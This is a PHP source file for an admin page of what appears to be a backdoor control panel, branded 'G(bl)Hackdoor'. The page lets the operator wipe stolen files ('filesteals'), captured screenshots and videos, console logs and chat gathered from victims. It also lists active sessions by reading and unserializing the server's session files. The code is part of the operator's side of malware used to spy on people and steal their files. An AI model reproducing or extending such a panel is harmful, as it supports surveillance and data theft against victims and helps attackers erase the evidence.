<?php include('isdefault.php') ?>
<?php
if (!IsAdmin($_SESSION['id'])){
    die("NOPPPPPP !!!!");
}
if(isset($_GET['action'])){

function rrmdir($dir) { 
   if (is_dir($dir)) { 
     $objects = scandir($dir); 
     foreach ($objects as $object) { 
       if ($object != "." && $object != "..") { 
         if (is_dir($dir."/".$object))
           rrmdir($dir."/".$object);
         else
           unlink($dir."/".$object); 
       } 
     }
     rmdir($dir); 
   } 
 }

$a = $_GET['action'];

    if($a == "video"){
       rrmdir("core/video/");
       mkdir("core/video");
       Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Les videos ont été supprimé par cette ip :".$ip."</p>");
    }

     if($a == "image"){
       rrmdir("core/image/");
       mkdir("core/image");
       Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Les screenshots ont été supprimé par cette ip :".$ip."</p>");
    }

    if($a == "logs"){
    	$GLOBALS['DB']->Delete('logs');
        $GLOBALS['DB']->Delete('logs_login');
        Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Les logs ont été supprimé par cette ip :".$ip."</p>");

    }
    if($a == "console"){
        $GLOBALS['DB']->Delete('console');
        Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Les consolelogs ont été supprimé par cette ip :".$ip."</p>");
    }
    if($a == "chat"){
        $GLOBALS['DB']->Delete('chat');
        Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Le chat a été supprimé par cette ip :".$ip."</p>");
    }

    if ($a == "fs"){
        $GLOBALS['DB']->Delete('file_steals');
        $GLOBALS['DB']->Delete('file_steals_list');
        rrmdir("core/stealed");
        mkdir("core/stealed");
        file_put_contents("core/stealed/index.php", "no");
        Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Les filesteals ont été supprimé par cette ip :".$ip."</p>");
    }
}

     function unserialize_php($session_data) {
        $return_data = array();
        $offset = 0;
        while ($offset < strlen($session_data)) {
            if (!strstr(substr($session_data, $offset), "|")) {
                throw new Exception("invalid data, remaining: " . substr($session_data, $offset));
            }
            $pos = strpos($session_data, "|", $offset);
            $num = $pos - $offset;
            $varname = substr($session_data, $offset, $num);
            $offset += $num + 1;
            $data = unserialize(substr($session_data, $offset));
            $return_data[$varname] = $data;
            $offset += strlen(serialize($data));
        }
        return $return_data;
    }
?>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<style>
    body{
        background-color: #152036;
    }
</style>
<div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                                 <div class="panel-heading"><i class="fa fa-list-alt"></i>&nbsp;Clear</div>
              <div class="panel-body" style="color:white; background-color: #1B2A47;">
                  <a href="?action=video" class="btn btn-primary"><font color="white">Clear Video</font></a>
                  <a href="?action=img" class="btn btn-primary"><font color="white">Clear Image</font></a>
                  <a href="?action=console" class="btn btn-primary"><font color="white">Clear Console</font></a>
                  <a href="?action=chat" class="btn btn-warning"><font color="white">Clear Chat</font></a>
                  <a href="?action=logs" class="btn btn-danger"><font color="white">Clear Logs</font></a>
                  <a href="?action=fs" class="btn btn-danger"><font color="white">Clear Filesteals</font></a>
                  <br />
                  Sessions :<br />
                  <?php foreach (glob(session_save_path()."/sess_*") as $v) {
                  	if( strpos(file_get_contents($v),"id") !== false) {
                  		$ss = unserialize_php(file_get_contents($v));
                  		$id = $ss["id"];
                  		$url = $ss["url"];
                  		?>
                  		<a class="text-danger" href="seeuser.php?user=<?php echo $id; ?>"><?php echo Account::GetUsername($id); ?></a> : <a class="text-success" href="<?php echo $url; ?>"><?php echo $url; ?></a>
                  		<br />
                  		<?php
				    }
				   
                  } ?>
              </div>

                            </font>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                                 <div class="panel-heading"><i class="fa fa-list-alt"></i>&nbsp;Logs</div>
              <div class="panel-body" id="logs-body" style="color:white; background-color: #152036;"></div>
                            </font>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php include('isdefault_down.php') ?>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
</html>
